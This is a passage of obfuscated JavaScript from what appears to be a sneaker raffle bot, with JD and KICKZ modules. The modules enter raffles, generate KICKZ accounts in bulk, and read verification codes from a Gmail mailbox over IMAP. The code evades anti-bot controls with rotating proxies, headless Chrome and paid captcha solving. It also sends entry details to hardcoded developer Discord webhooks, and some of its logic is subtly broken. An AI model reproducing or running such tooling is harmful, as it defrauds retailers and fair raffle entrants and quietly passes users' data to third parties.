                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x485df8['name'] + ']\x20Task\x20' + (_0x16866c + 0x1) + '\x20:\x20Retrying\x20(' + _0xf570a2 + '\x20/\x205)')), _0x16866c = _0x16866c - 0x1, _0xf570a2 = _0xf570a2 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x7e058a, _0xa9525c, _0x29c82b) {
                var _0x23bbab = ![], _0x2ff19d = ![];
                if (_0x579cef['captchaKey'] == '' || _0x579cef['captchaKey'] == undefined)
                    return console['log'](_0x218a39['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x579cef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x260bee = 0x0; _0x260bee < _0xa9525c['length']; _0x260bee++) {
                    if (_0x59f36a != 'yes')
                        var _0x59f36a = '', _0x21273d = 0x0;
                    var _0xc61b86, _0x30bed9 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0xa9525c[_0x260bee]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xa9525c[_0x260bee]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3f93ac
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x579cef['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4a92ac
                            }
                        ]
                    }];
                    const _0x911cff = { 'embeds': _0x30bed9 };
                    _0x3e0125(_0x7e058a['name'] + '\x20Task\x20' + (_0x260bee + 0x1) + '\x20/\x20' + _0xa9525c['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                    try {
                        await _0x48a0b3(_0xa9525c, _0x260bee);
                    } catch {
                        _0x59f36a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x2e2dff = await _0x3ead77(_0xa9525c[_0x260bee], _0x7e058a, 'dev', ![]), _0x5e19d5 = await _0x3ead77(_0xa9525c[_0x260bee], _0x7e058a, 'pub', ![]);
                    const _0x4cd1a1 = {
                        'succesDEVMSG': { 'embeds': [_0x2e2dff] },
                        'succesPUBMSG': { 'embeds': [_0x5e19d5] }
                    };
                    if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                        try {
                            await _0x4401f2(_0x579cef['webhook'], _0x4cd1a1['succesDEVMSG']);
                        } catch {
                        }
                    await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x4cd1a1['succesDEVMSG']), await _0xaebb71(0xc8);
                    try {
                        await _0x4401f2(_0x2aae93, _0x4cd1a1['succesPUBMSG']);
                    } catch {
                    }
                    if (_0xa9525c[_0x260bee]['Email'] == '' || _0xa9525c[_0x260bee]['Url'] == '' || _0xa9525c[_0x260bee]['FirstName'] == '' || _0xa9525c[_0x260bee]['LastName'] == '') {
                        console['log'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x579cef['useRandomProxy'] = ![])
                        var _0x215ff2 = _0x29c82b[_0x260bee]['split'](':');
                    else
                        var _0x311da2 = Math['round'](Math['random']() * (_0x29c82b['length'] - 0x1)), _0x215ff2 = _0x29c82b[_0x311da2]['split'](':');
                    var _0x927b6c;
                    try {
                        _0x927b6c = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x215ff2[0x0] + ':' + _0x215ff2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x927b6c = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x215ff2[0x0] + ':' + _0x215ff2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x8976ec = await _0x927b6c['newPage']();
                        await _0x8976ec['authenticate']({
                            'username': '' + _0x215ff2[0x2],
                            'password': '' + _0x215ff2[0x3]
                        }), console['log'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Getting\x20Session'), await _0x8976ec['setRequestInterception'](!![]), _0x8976ec['on']('request', _0x192f7d => {
                            _0x192f7d['resourceType']() === 'image' || _0x192f7d['resourceType']() === 'font' || _0x192f7d['resourceType']() === 'media' ? _0x192f7d['abort']() : _0x192f7d['continue']();
                        });
                        try {
                            await _0x8976ec['goto']('' + _0xa9525c[_0x260bee]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x8976ec['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Filling\x20Information'), await _0x8976ec['type']('#comp_firstname', '' + _0xa9525c[_0x260bee]['FirstName']), await _0x8976ec['waitForSelector']('#comp_lastname'), await _0x8976ec['type']('#comp_lastname', '' + _0xa9525c[_0x260bee]['LastName']), await _0x8976ec['waitForSelector']('#comp_email'), await _0x8976ec['type']('#comp_email', '' + _0xa9525c[_0x260bee]['Email']), await _0x8976ec['waitForSelector']('#comp_paypalemail'), await _0x8976ec['type']('#comp_paypalemail', '' + _0xa9525c[_0x260bee]['Email']), await _0x8976ec['waitForSelector']('#comp_mobile_end'), await _0x8976ec['type']('#comp_mobile_end', '' + _0xa9525c[_0x260bee]['Phone']), await _0x8976ec['waitForSelector']('#comp_dob'), await _0x8976ec['type']('#comp_dob', '08/09/1992'), console['log'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0xa9525c[_0x260bee]['Size'] == 'RANDOM') {
                            const _0x13d5e6 = await _0x8976ec['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x55bdec => {
                                return _0x55bdec['map'](_0x5c9a78 => _0x5c9a78['value']);
                            });
                            var _0x1a36ba = Math['round'](Math['random']() * (_0x13d5e6['length'] - 0x2));
                            await _0x8976ec['select']('#shoesize', _0x13d5e6[_0x1a36ba + 0x1]), await _0xaebb71(0x3e8);
                        } else {
                            const _0x386a35 = await _0x8976ec['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5915d2 => {
                                return _0x5915d2['map'](_0x22113a => _0x22113a['innerText']);
                            }), _0x575ee0 = await _0x8976ec['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x55e2a5 => {
                                return _0x55e2a5['map'](_0x4b21c3 => _0x4b21c3['value']);
                            });
                            var _0x2f0339 = _0xa9525c[_0x260bee]['Size'];
                            for (var _0xd12dd1 = 0x1; _0xd12dd1 < _0x575ee0['length']; _0xd12dd1++) {
                                var _0xca2a8d = _0x386a35[_0xd12dd1]['split']('\x20')[0x0];
                                if (_0xca2a8d == _0x2f0339) {
                                    await _0x8976ec['select']('#shoesize', _0x575ee0[_0xd12dd1]);
                                    break;
                                } else {
                                    if (_0xd12dd1 + 0x1 == _0x575ee0['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x8976ec['waitForSelector']('#comp_address1'), await _0x8976ec['type']('#comp_address1', _0xa9525c[_0x260bee]['Address1'] + '\x20' + _0xa9525c[_0x260bee]['HouseNumber']), await _0x8976ec['waitForSelector']('#comp_address2'), await _0x8976ec['type']('#comp_address2', '' + _0xa9525c[_0x260bee]['Address2']), await _0x8976ec['waitForSelector']('#comp_address2'), await _0x8976ec['type']('#comp_address3', '' + _0xa9525c[_0x260bee]['City']), await _0x8976ec['waitForSelector']('#comp_postcode'), await _0x8976ec['type']('#comp_postcode', '' + _0xa9525c[_0x260bee]['Zip']), console['log'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xaebb71(0x4b0), await _0x8976ec['click']('label#emailhold'), await _0xaebb71(0x5dc), await _0x8976ec['click']('#preauth_tandc_email\x20>\x20label'), await _0xaebb71(0x5dc), await _0x8976ec['click']('#submit');
                        try {
                            await _0x8976ec['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20' + _0x218a39['blue']('Awaiting\x20Paypal\x20Payment')), _0x927b6c['on']('targetcreated', async _0x3be854 => {
                            if (_0x3be854['type']() === 'page') {
                                const _0x1759be = await _0x3be854['page']();
                                async function _0xa4f315() {
                                    try {
                                        await _0x8976ec['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2ff19d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x5cc926() {
                                    try {
                                        await _0x8976ec['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x23bbab = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x5cc926(), _0xa4f315(), await _0xaebb71(0x493e0);
                            }
                        });
                        async function _0x87540d() {
                            for (let _0x6f404b = 0x0; _0x6f404b < 0x12c; _0x6f404b++) {
                                if (_0x23bbab == !![]) {
                                    _0x59f36a = 'no', _0x20f501(_0xa9525c[_0x260bee], _0x7e058a), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                        try {
                                            await _0x4401f2(_0x579cef['webhook'], _0x4cd1a1['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x4cd1a1['succesDEVMSG']), await _0xaebb71(0xc8);
                                    try {
                                        await _0x4401f2(_0x2aae93, _0x4cd1a1['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x2ff19d)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xaebb71(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xaebb71(0xbb8), await _0x8976ec['click']('.zoid-outlet'), await _0xaebb71(0x7d0), await _0x87540d();
                    } catch (_0x3304cd) {
                        console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20' + _0x3304cd)), _0xc61b86 = '' + _0x3304cd;
                        var _0x45da59 = await _0x3ead77(_0xa9525c[_0x260bee], _0x7e058a, 'dev', !![], _0xc61b86);
                        _0x4cd1a1['errorDEV'] = { 'embeds': [_0x45da59] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4cd1a1['errorDEV']), await _0x4401f2(_0x2631ac, _0x4cd1a1['errorDEV']);
                    } finally {
                        _0x927b6c && _0x927b6c['close']();
                        if (_0x59f36a == 'yes' && _0x21273d != 0x5 && _0xc61b86 != 'Size\x20Not\x20Found') {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x7e058a['name'] + ']\x20Task\x20' + (_0x260bee + 0x1) + '\x20:\x20Retrying\x20(' + _0x21273d + '\x20/\x205)')), _0x260bee = _0x260bee - 0x1, _0x21273d = _0x21273d + 0x1;
                            continue;
                        }
                        _0x59f36a == 'yes' && _0x21273d >= 0x5 && (_0x47d653(afew[_0x260bee], _0x7e058a), _0x59f36a = 'no', _0x21273d = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x351336, _0x1ba37d, _0x10b803) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3a8fbc = 0x0; _0x3a8fbc < _0x1ba37d['length']; _0x3a8fbc++) {
                        const _0x7bd8b6 = 'https://www.kickz.com/login';
                        if (_0x72f9 != 'yes')
                            var _0x72f9 = '', _0x4408c3 = 0x0;
                        _0x3e0125(_0x351336['name'] + '\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20/\x20' + _0x1ba37d['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        try {
                            await _0x48a0b3(_0x1ba37d, _0x3a8fbc);
                        } catch {
                            _0x72f9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4dc00c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3f93ac
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x579cef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a92ac
                                }
                            ]
                        }];
                        const _0x3e8e84 = { 'embeds': _0x4dc00c };
                        var _0x5dc31a = await _0x3ead77(_0x1ba37d[_0x3a8fbc], _0x351336, 'acc', ![]);
                        const _0x1c88ca = { 'succesDEVMSG': { 'embeds': [_0x5dc31a] } };
                        if (_0x1ba37d[_0x3a8fbc]['Email'] == '' || _0x1ba37d[_0x3a8fbc]['FirstName'] == '' || _0x1ba37d[_0x3a8fbc]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1ba37d[_0x3a8fbc]['Password'] == '' && (_0x1ba37d[_0x3a8fbc]['Password'] = 'JRaffles23!');
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x42bbe2 = _0x10b803[_0x3a8fbc]['split'](':');
                        else
                            var _0x46cbaf = Math['round'](Math['random']() * (_0x10b803['length'] - 0x1)), _0x42bbe2 = _0x10b803[_0x46cbaf]['split'](':');
                        var _0x5f0562;
                        try {
                            _0x5f0562 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x42bbe2[0x0] + ':' + _0x42bbe2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5f0562 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x42bbe2[0x0] + ':' + _0x42bbe2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2c04db = await _0x5f0562['newPage']();
                            await _0x2c04db['authenticate']({
                                'username': '' + _0x42bbe2[0x2],
                                'password': '' + _0x42bbe2[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c04db['setRequestInterception'](!![]), _0x2c04db['on']('request', _0x35e2c8 => {
                                _0x35e2c8['resourceType']() === 'image' || _0x35e2c8['resourceType']() === 'font' || _0x35e2c8['resourceType']() === 'media' ? _0x35e2c8['abort']() : _0x35e2c8['continue']();
                            }), await _0x2c04db['goto'](_0x7bd8b6), await _0xaebb71(0xbb8), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x2c04db['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2c04db['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2c04db['waitForSelector']('#button-register'), await _0xaebb71(0x7d0), await _0x2c04db['evaluate'](() => {
                                const _0x3abc52 = document['querySelector']('#button-register');
                                _0x3abc52['click']();
                            }), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xaebb71(0x1388), await _0x2c04db['waitForSelector']('#customer_salutation'), await _0x2c04db['select']('#customer_salutation', 'mr'), await _0xaebb71(0x7d0), await _0x2c04db['waitForSelector']('#customer_firstname'), await _0x2c04db['type']('#customer_firstname', '' + _0x1ba37d[_0x3a8fbc]['FirstName']), await _0xaebb71(0x352), await _0x2c04db['waitForSelector']('#customer_lastname'), await _0x2c04db['type']('#customer_lastname', '' + _0x1ba37d[_0x3a8fbc]['LastName']), await _0xaebb71(0x352), await _0x2c04db['type']('#email-input', '' + _0x1ba37d[_0x3a8fbc]['Email']), await _0xaebb71(0x352), await _0x2c04db['type']('#email-confirm-input', '' + _0x1ba37d[_0x3a8fbc]['Email']), await _0xaebb71(0x352), await _0x2c04db['type']('#register-password', '' + _0x1ba37d[_0x3a8fbc]['Password']), await _0xaebb71(0x352), await _0x2c04db['type']('#password-confirm', '' + _0x1ba37d[_0x3a8fbc]['Password']), await _0xaebb71(0x352), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x2c04db['click']('#consent'), await _0xaebb71(0x1f4);
                            const _0x47574d = await _0x2c04db['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x47574d) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x2c04db['click']('#buttonRegister');
                            try {
                                await _0x2c04db['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1ba37d[_0x3a8fbc]['Email']), await _0xaebb71(0x4b0);
                            async function _0x3e67b3() {
                                var _0x20f195, _0x26aa69 = ![];
                                for (var _0xdb70f4 = 0x0; _0xdb70f4 < 0x18; _0xdb70f4++) {
                                    async function _0x48e493() {
                                        var _0x2151c3 = new _0x2b87aa({
                                            'user': _0x579cef['masterMail'],
                                            'password': _0x579cef['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x114fb2(_0x8339de) {
                                            _0x2151c3['openBox']('INBOX', ![], _0x8339de);
                                        }
                                        _0x2151c3['once']('ready', function () {
                                            console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x114fb2(function (_0x10a289, _0x5ed44e) {
                                                console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x10a289)
                                                    throw _0x10a289;
                                                _0x2151c3['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x172883, _0x45c3d1) {
                                                    if (!_0x45c3d1 || !_0x45c3d1['length'])
                                                        console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2151c3['end']();
                                                    else {
                                                        var _0x5edbc8 = _0x2151c3['seq']['fetch'](_0x45c3d1, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5edbc8['on']('message', function (_0x3bde1d, _0x4957bf) {
                                                            var _0x8a3702 = '(#' + _0x4957bf + ')\x20';
                                                            _0x3bde1d['on']('body', function (_0xbc0155, _0x2922d1) {
                                                                _0x554795(_0xbc0155, (_0x10e30f, _0x5159ed) => {
                                                                    if (_0x5159ed['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x39b187 = _0x5159ed['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x494d51 = _0x39b187[0x1]['split']('<')[0x0];
                                                                        _0x20f195 = _0x494d51;
                                                                    }
                                                                });
                                                            }), _0x3bde1d['once']('end', function () {
                                                            });
                                                        }), _0x5edbc8['once']('error', function (_0x1e27db) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5edbc8['once']('end', function () {
                                                            _0x2151c3['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2151c3['once']('error', function (_0x3ed640) {
                                            console['log'](_0x218a39['red'](_0x3ed640['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x26aa69 = !![];
                                        }), _0x2151c3['once']('end', async function () {
                                        }), _0x2151c3['connect']();
                                    }
                                    _0x48e493(), await _0xaebb71(0x1388);
                                    if (_0x20f195)
                                        return _0x20f195;
                                    if (_0x26aa69)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0xdb70f4 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3e67b3(), _0xaebb71(0x320), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Verifying..'), await _0x2c04db['type']('#verificationCode', code), await _0xaebb71(0x1f4), await _0x2c04db['click']('#buttonVerify'), await _0xaebb71(0x190), await _0x2c04db['click']('#buttonVerify'), await _0xaebb71(0x3e8);
                            try {
                                await _0x2c04db['waitForSelector']('div.b-user_greeting'), _0x72f9 = 'no', console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Account\x20' + _0x1ba37d[_0x3a8fbc]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x4a3ff4['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1ba37d[_0x3a8fbc]['Email'] + ',' + _0x1ba37d[_0x3a8fbc]['Password'] + ','), console['log'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Account\x20' + _0x1ba37d[_0x3a8fbc]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x1c88ca['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4401f2(_0x1acce0, _0x1c88ca['succesDEVMSG']);
                            } catch {
                                _0x72f9 = 'no', console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x5e246a) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20' + _0x5e246a)), _0x4dc00c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4dc00c[0x0]['description'] = '' + _0x5e246a, await _0x4401f2(_0x2631ac, _0x3e8e84), _0x72f9 = 'yes';
                        } finally {
                            _0x5f0562 && _0x5f0562['close']();
                            if (_0x72f9 == 'yes' && _0x4408c3 != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x351336['name'] + ']\x20Task\x20' + (_0x3a8fbc + 0x1) + '\x20:\x20Retrying\x20(' + _0x4408c3 + '\x20/\x205)')), _0x3a8fbc = _0x3a8fbc - 0x1, _0x4408c3 = _0x4408c3 + 0x1;
                                continue;
                            }
                            _0x72f9 == 'yes' && _0x4408c3 >= 0x5 && (_0x47d653(_0x1ba37d[_0x3a8fbc], _0x351336), _0x72f9 = 'no', _0x4408c3 = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x141857, _0x394c6d, _0x25cd22) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x22f56b = 0x0; _0x22f56b < _0x394c6d['length']; _0x22f56b++) {
                        var _0x3b96e9;
                        if (_0x92deca != 'yes')
                            var _0x92deca = '', _0x16a925 = 0x0;
                        _0x3e0125(_0x141857['name'] + '\x20Task\x20' + (_0x22f56b + 0x1) + '\x20/\x20' + _0x394c6d['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        var _0x2ef312 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3f93ac
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x394c6d[_0x22f56b]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x394c6d[_0x22f56b]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x579cef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a92ac
                                }
                            ]
                        }], _0x577bdd = await _0x3ead77(_0x394c6d[_0x22f56b], _0x141857, 'dev', ![]), _0x482460 = await _0x3ead77(_0x394c6d[_0x22f56b], _0x141857, 'pub', ![]);
                        const _0x4ff459 = {
                            'succesDEVMSG': { 'embeds': [_0x577bdd] },
                            'succesPUBMSG': { 'embeds': [_0x482460] }
                        };
                        try {
                            await _0x48a0b3(_0x394c6d, _0x22f56b);
                        } catch {
                            _0x92deca = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x394c6d[_0x22f56b]['Email'] == '' || _0x394c6d[_0x22f56b]['Password'] == '' || _0x394c6d[_0x22f56b]['FirstName'] == '' || _0x394c6d[_0x22f56b]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x47d31c = _0x25cd22[_0x22f56b]['split'](':');
                        else
